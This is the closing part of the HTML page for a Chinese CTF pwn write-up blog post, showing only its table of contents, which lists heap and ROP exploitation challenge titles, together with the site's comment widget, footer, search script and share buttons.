Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-simpleHeap-off-by-one-fastbin-attack-one-gadget"><span class="toc-text">[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget"><span class="toc-text">[V&amp;N2020 公开赛]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E5%8A%AB%E6%8C%81-malloc-hook"><span class="toc-text">解法一：劫持__malloc_hook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%94%BB%E5%87%BBstdout%E5%8A%AB%E6%8C%81vtable%E8%A1%A8"><span class="toc-text">解法二：攻击stdout劫持vtable表</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-FILE-plus%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%AD-vtable-%E7%9B%B8%E5%AF%B9%E5%81%8F%E7%A7%BB"><span class="toc-text">_IO_FILE_plus结构体中 vtable 相对偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vtable-%E5%90%88%E6%B3%95%E6%80%A7%E6%A3%80%E6%B5%8B-start-from-glibc2-24"><span class="toc-text">vtable 合法性检测(start from glibc2.24)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vtable%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%A7%BF%E5%8A%BF-under-glibc2-28"><span class="toc-text">vtable表劫持姿势(under glibc2.28)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-warmup-orw"><span class="toc-text">[V&amp;N2020 公开赛]warmup - orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-babybabypwn-SROP-orw"><span class="toc-text">[V&amp;N2020 公开赛]babybabypwn - SROP + orw</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VNCTF2021-Pwn"><span class="toc-text">VNCTF2021 - Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-White-Give-Flag-read-out-of-bounds"><span class="toc-text">[VNCTF 2021]White_Give_Flag - read out of bounds</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack"><span class="toc-text">[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4"><span class="toc-text">glibc2.32下tcache新增的保护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#glibc-2-31%E4%B8%8B%E7%9A%84-tcache-put-%E4%B8%8E-tcache-get"><span class="toc-text">glibc 2.31下的 tcache_put 与 tcache_get</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#glibc-2-32%E4%B8%8B%E7%9A%84-tcache-put-%E4%B8%8E-tcache-get"><span class="toc-text">glibc 2.32下的 tcache_put 与 tcache_get</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#glibc2-32%E4%B8%8B%E5%A0%86%E5%9F%BA%E5%9D%80%E7%9A%84%E6%96%B0%E6%B3%84%E9%9C%B2%E6%96%B9%E5%BC%8F"><span class="toc-text">glibc2.32下堆基址的新泄露方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#what%E2%80%99s-more"><span class="toc-text">what’s more?</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-hh"><span class="toc-text">[VNCTF 2021]hh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2021-LittleRedFlower-stackoverflow-orw"><span class="toc-text">[VNCTF 2021]LittleRedFlower - stackoverflow + orw</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#N1BOOK-Pwn"><span class="toc-text">N1BOOK - Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-ret2csu-ret2libc"><span class="toc-text">ROP - ret2csu + ret2libc</span></a></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
        placeholder: '说点什么呗...',
        avatar: 'retro',
        lang: 'zh-CN'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:arttnba@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright © 2022 arttnba3</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90CTF.0x00%E3%80%91BUUCTF%2FBUUOJ-Pwn%20WP + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2020%2F09%2F08%2FCTF-0X00-BUUOJ-PWN%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
